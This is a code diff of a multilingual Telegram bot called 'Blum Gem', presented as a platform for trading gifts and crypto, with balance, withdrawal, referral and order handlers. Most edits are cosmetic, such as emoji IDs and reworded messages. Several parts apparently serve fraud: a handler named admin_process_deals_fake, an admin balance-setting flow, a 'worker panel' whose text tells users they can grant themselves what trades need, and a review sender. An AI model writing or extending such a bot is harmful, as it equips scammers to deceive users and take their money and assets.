-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>您的余额：</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>您的余额：</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "提现",
         "btn_history": "余额历史",
         "btn_active_requests": "活跃请求",
@@ -947,18 +852,17 @@ TEXTS = {
         "btn_main_menu": "返回菜单",
     },
     "ja": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>当社へようこそ。</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gem - ギフトや資産の売買のための簡単な管理とデザインのプラットフォーム。</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> 自動化された便利なデザイン。\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> スピードと自動化。\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> 最速の出金。\n\n'
-            '• サービス手数料：0%\n'
-            '• 営業時間：24/7\n'
-            '• テクニカルサポート：@BlumGemes\n'
-            '• 当社ウェブサイト - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>以下のセクションを選択してください：</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - 便利なデザインと簡単な管理を備えた専門プラットフォーム。</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>当社の強み：</b>\n'
+            '• サービス手数料は0%です。\n'
+            '• 営業時間は24/7です。\n'
+            '• テクニカルサポートからの迅速な対応。\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>連絡先：</b>\n'
+            '• サポート @BlumGemes。\n'
+            '• チャンネル @BlumCrypto。'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>マニュアルは下のボタンから見つけられます。ボタンを使って取引に必要なものを自分に付与することもできます。</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>アドレスが更新されました</b>',
@@ -1024,7 +928,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> 詳細：/freeze_balance'
         ),
         "verification_failed": "商品が検出されなかったか、検証に失敗しました。\n\n転送された商品またはギフトの正確性を確認して、もう一度お試しください。",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>ウォレット詳細</b>\n\n<b>詳細を変更および追加できます。</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>あなたのウォレット。</b>\n\n<b>このセクションではウォレットの詳細を追加または変更できます。</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAMウォレット</b>\n\n<blockquote>現在：{}</blockquote>\n\n<i>新しいウォレットアドレスを1つのメッセージで送信</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDTウォレット</b>\n\n<blockquote>現在：{}</blockquote>\n\n<i>新しいウォレットアドレス（TRC-20/ERC-20）を1つのメッセージで送信</i>',
         "card_setup_title": (
@@ -1045,7 +949,7 @@ TEXTS = {
             '• 出金コードを他人と共有しないでください。'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>テクニカルサポートエージェント</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>紹介リンク：</b>\n\n<code>{link}</code>\n\n友達を招待して、彼らの支出の5%を獲得しましょう！',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>あなたのリンク：</b>\n\n<code>{link}</code>\n\n<b>ボットでのパートナーの支出から3%を獲得しましょう！</b>',
         "invite_text": (
             '<b>注文に招待されました: #{order_id}</b>\n\n'
             '<b>金額:</b> {amount} {currency}\n'
@@ -1076,7 +980,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>送信者へのコメントを入力：</b>\n\n<b>禁止：悪口、侮辱、脅迫。</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>コメントがユーザーに正常に送信されました。</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>@{} からのコメント：</b>\n\n{}',
-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>残高：</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>残高：</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "出金",
         "btn_history": "残高履歴",
         "btn_active_requests": "アクティブなリクエスト",
@@ -1206,7 +1110,6 @@ def register_user(user_id: int, username: str = None):
         if "history" not in db[user_id]: db[user_id]["history"] = []
         if "withdrawals" not in db[user_id]: db[user_id]["withdrawals"] = []
         if username: db[user_id]["username"] = username
-    # save_db() - УБРАНО! Не сохраняем при каждом вызове
 
 def get_lang(user_id: int) -> str:
     return db.get(user_id, {}).get("lang", "ru")
@@ -1309,6 +1212,7 @@ async def show_balance_menu(message: types.Message, edit: bool = False):
     print(f"[DEBUG] ПОКАЗ БАЛАНСА: rub={user.get('balance_rub', 0)}")
     
     text = TEXTS[lang]["balance_title"].format(
+        stars=user.get("balance_stars", 0),
         gram=user.get("balance_gram", 0),
         usdt=user.get("balance_usdt", 0),
         rub=user.get("balance_rub", 0),
@@ -1319,13 +1223,13 @@ async def show_balance_menu(message: types.Message, edit: bool = False):
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_withdraw"],
-            emoji_id="5206401524200145033",
+            emoji_id="5846097080002550195",
             callback_data="balance_withdraw",
-            style="primary"
+            style="success"
         ),
         PremiumButton(
             text=TEXTS[lang]["btn_history"],
-            emoji_id="5276395476646653290",
+            emoji_id="5775896410780079073",
             callback_data="balance_history",
             style="primary"
         )
@@ -1344,7 +1248,7 @@ async def show_balance_menu(message: types.Message, edit: bool = False):
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         )
@@ -1354,8 +1258,6 @@ async def show_balance_menu(message: types.Message, edit: bool = False):
         await message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
     else:
         await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
-
-# ==================== ОСНОВНЫЕ ОБРАБОТЧИКИ ====================
 
 @dp.callback_query(lambda call: call.data == "balance")
 async def process_balance(callback: types.CallbackQuery):
@@ -1422,7 +1324,7 @@ async def balance_withdraw(callback: types.CallbackQuery, state: FSMContext):
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_balance",
             style="primary"
         )
@@ -1471,7 +1373,7 @@ async def withdraw_currency_selected(callback: types.CallbackQuery, state: FSMCo
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_withdraw",
             style="primary"
         )
@@ -1509,7 +1411,7 @@ async def withdraw_address_handler(message: types.Message, state: FSMContext):
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_withdraw",
             style="primary"
         )
@@ -1573,7 +1475,6 @@ async def withdraw_amount_handler(message: types.Message, state: FSMContext):
     
     await state.clear()
     
-    # Отправляем лог админу 7670534842
     try:
         username = db[user_id].get("username", str(user_id))
         log_text = (
@@ -1612,15 +1513,13 @@ async def withdraw_amount_handler(message: types.Message, state: FSMContext):
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_balance",
             style="primary"
         )
     )
     
     await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
-
-# ==================== ОБРАБОТЧИКИ ВЫВОДОВ ====================
 
 @dp.callback_query(lambda call: call.data.startswith("withdraw_approve_"))
 async def withdraw_approve(callback: types.CallbackQuery):
@@ -1634,7 +1533,6 @@ async def withdraw_approve(callback: types.CallbackQuery):
     
     lang = get_lang(user_id)
     
-    # Обновляем статус заявки
     withdrawals = db[user_id].get("withdrawals", [])
     for w in withdrawals:
         if w.get("id") == request_id:
@@ -1643,11 +1541,11 @@ async def withdraw_approve(callback: types.CallbackQuery):
     
     save_db()
     
-    # Отправляем уведомление пользователю
     builder = InlineKeyboardBuilder()
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_main_menu"],
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         )
@@ -1663,7 +1561,6 @@ async def withdraw_approve(callback: types.CallbackQuery):
     except Exception as e:
         print(f"[DEBUG] Ошибка уведомления: {e}")
     
-    # Редактируем сообщение админа
     await callback.message.edit_text(
         text=callback.message.text + "\n\n✅ <b>Заявка одобрена</b>",
         parse_mode=ParseMode.HTML
@@ -1681,7 +1578,6 @@ async def withdraw_reject(callback: types.CallbackQuery):
     
     lang = get_lang(user_id)
     
-    # Обновляем статус заявки
     withdrawals = db[user_id].get("withdrawals", [])
     for w in withdrawals:
         if w.get("id") == request_id:
@@ -1690,11 +1586,11 @@ async def withdraw_reject(callback: types.CallbackQuery):
     
     save_db()
     
-    # Отправляем уведомление пользователю
     builder = InlineKeyboardBuilder()
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_main_menu"],
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         )
@@ -1710,15 +1606,12 @@ async def withdraw_reject(callback: types.CallbackQuery):
     except Exception as e:
         print(f"[DEBUG] Ошибка уведомления: {e}")
     
-    # Редактируем сообщение админа
     await callback.message.edit_text(
         text=callback.message.text + "\n\n❌ <b>Заявка отклонена</b>",
         parse_mode=ParseMode.HTML
     )
     
     await callback.message.edit_reply_markup(reply_markup=None)
-
-# ==================== КОМАНДЫ ====================
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
@@ -2004,6 +1897,7 @@ async def cmd_freeze_balance(message: types.Message):
     builder.row(
         PremiumButton(
             text="🔙 Назад" if lang == "ru" else "🔙 Back",
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         )
@@ -2043,6 +1937,7 @@ async def show_freeze_info(callback: types.CallbackQuery):
     builder.row(
         PremiumButton(
             text="🔙 Назад" if lang == "ru" else "🔙 Back",
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         )
@@ -2291,8 +2186,6 @@ async def transfer_comment_handler(message: types.Message, state: FSMContext):
     )
     await state.clear()
 
-# ==================== КНОПКИ ГЛАВНОГО МЕНЮ (ТЕКСТОВЫЕ) ====================
-
 @dp.message(lambda message: message.text in [
     "📋 Создать ордер", "📋 Create Order",
     "💼 Кошельки", "💼 Wallets",
@@ -2317,7 +2210,7 @@ async def cmd_main_menu_buttons(message: types.Message, state: FSMContext):
     elif text in ["🎎 Рефералы", "🎎 Referrals"]:
         ref_code = db[user_id]["ref_code"]
         bot_user = await bot.get_me()
-        link = f"https://telegram.me/{bot_user.username}?start=ref_{ref_code}"
+        link = f"https://t.me/{bot_user.username}?start=ref_{ref_code}"
         await message.answer(
             text=TEXTS[lang]["referral_title"].format(link=link),
             reply_markup=get_back_keyboard(lang),
@@ -2333,15 +2226,13 @@ async def cmd_main_menu_buttons(message: types.Message, state: FSMContext):
         ))
         builder.row(PremiumButton(
             text=TEXTS[lang]["btn_back"],
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_main",
             style="primary"
         ))
         await message.answer(text=TEXTS[lang]["support_title"], reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
     elif text in ["🌐 Язык", "🌐 Language"]:
         await show_language_selection(message)
-
-# ==================== CALLBACK КНОПКИ ГЛАВНОГО МЕНЮ ====================
 
 @dp.callback_query(lambda call: call.data == "warning_show")
 async def process_warning_show(callback: types.CallbackQuery):
@@ -2365,7 +2256,7 @@ async def process_open_referrals(callback: types.CallbackQuery):
     lang = get_lang(user_id)
     ref_code = db[user_id]["ref_code"]
     bot_user = await bot.get_me()
-    link = f"https://telegram.me/{bot_user.username}?start=ref_{ref_code}"
+    link = f"https://t.me/{bot_user.username}?start=ref_{ref_code}"
     
     await safe_delete(callback)
     await callback.message.answer(
@@ -2389,7 +2280,7 @@ async def process_open_support(callback: types.CallbackQuery):
     ))
     builder.row(PremiumButton(
         text=TEXTS[lang]["btn_back"],
-        emoji_id="5312086014926285265",
+        emoji_id="5875082500023258804",
         callback_data="back_to_main",
         style="primary"
     ))
@@ -2427,8 +2318,6 @@ async def process_open_faq(callback: types.CallbackQuery):
     await safe_delete(callback)
     lang = get_lang(callback.from_user.id)
     await callback.message.answer(text=TEXTS[lang]["faq_title"], reply_markup=get_back_keyboard(lang), parse_mode=ParseMode.HTML)
-
-# ==================== ОРДЕРА ====================
 
 @dp.callback_query(lambda call: call.data.startswith("pay_select_"))
 async def process_pay_selection(callback: types.CallbackQuery, state: FSMContext):
@@ -2947,8 +2836,6 @@ async def close_order_no(callback: types.CallbackQuery):
         parse_mode=ParseMode.HTML
     )
 
-# ==================== КОШЕЛЬКИ ====================
-
 @dp.callback_query(lambda call: call.data == "wallet_setup_gram")
 async def process_wallet_setup_gram(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -3069,8 +2956,6 @@ async def save_stars_recipient_handler(message: types.Message, state: FSMContext
     await message.answer(text=TEXTS[lang]["wallet_updated"], reply_markup=get_back_keyboard(lang), parse_mode=ParseMode.HTML)
     await state.clear()
 
-# ==================== РАБОЧАЯ ПАНЕЛЬ ====================
-
 @dp.callback_query(lambda call: call.data == "accept_terms")
 async def accept_terms(callback: types.CallbackQuery):
     await callback.answer()
@@ -3123,7 +3008,7 @@ async def show_manual(callback: types.CallbackQuery):
     builder.row(
         PremiumButton(
             text="Назад",
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_worker_panel",
             style="primary"
         )
@@ -3171,7 +3056,6 @@ async def admin_process_balance(message: types.Message, state: FSMContext):
         user_id = message.from_user.id
         register_user(user_id)
         
-        # ПРИНУДИТЕЛЬНАЯ ИНИЦИАЛИЗАЦИЯ ВСЕХ КЛЮЧЕЙ БАЛАНСА
         for key in ["balance_gram", "balance_rub", "balance_usdt", "balance_stars", "balance_uah"]:
             if key not in db[user_id]:
                 db[user_id][key] = 0.0
@@ -3229,7 +3113,7 @@ async def admin_parser(callback: types.CallbackQuery):
     builder.row(
         PremiumButton(
             text="Назад" if lang == "ru" else "Back",
-            emoji_id="5312086014926285265",
+            emoji_id="5875082500023258804",
             callback_data="back_to_worker_panel",
             style="primary"
         )
@@ -3269,8 +3153,6 @@ async def admin_process_deals_fake(message: types.Message, state: FSMContext):
         await message.answer("❌ Неверный формат. Введите число.")
     finally:
         await state.clear()
-
-# ==================== INLINE QUERY ====================
 
 @dp.inline_query(lambda q: q.query.startswith("deal_"))
 async def inline_deal_handler(inline_query: types.InlineQuery):
@@ -3320,11 +3202,8 @@ async def inline_deal_handler(inline_query: types.InlineQuery):
     ]
     await inline_query.answer(results, is_personal=True, cache_time=1)
 
-# ==================== ЗАПУСК ====================
-
 async def main():
     load_db()
-    start_review_sender()  # <--- ЗАПУСК РАССЫЛКИ
     print("Бот успешно запущен...")
     await dp.start_polling(bot)
 
